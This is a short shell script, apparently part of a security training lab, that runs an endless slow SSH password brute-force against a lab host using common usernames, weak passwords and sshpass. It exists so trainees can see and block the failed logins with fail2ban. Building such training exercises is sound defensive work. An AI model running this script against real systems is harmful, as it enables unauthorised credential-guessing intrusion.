#!/bin/sh
# Slow SSH brute-force against the lab TARGET only (training). Generates
# `Failed password` entries in the target's auth.log so the player can detect,
# firewall, and fail2ban-ban this source. Deliberately gentle and bounded.
: "${TARGET:=host.lab}"
USERS="root admin test user"
PASSWORDS="123456 password admin root letmein qwerty"
echo "[attacker] brute-forcing ssh://$TARGET (lab only)"
while true; do
  for u in $USERS; do
    for p in $PASSWORDS; do
      sshpass -p "$p" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no "$u@$TARGET" exit 2>/dev/null
      sleep 2
    done
  done
  sleep 10
done
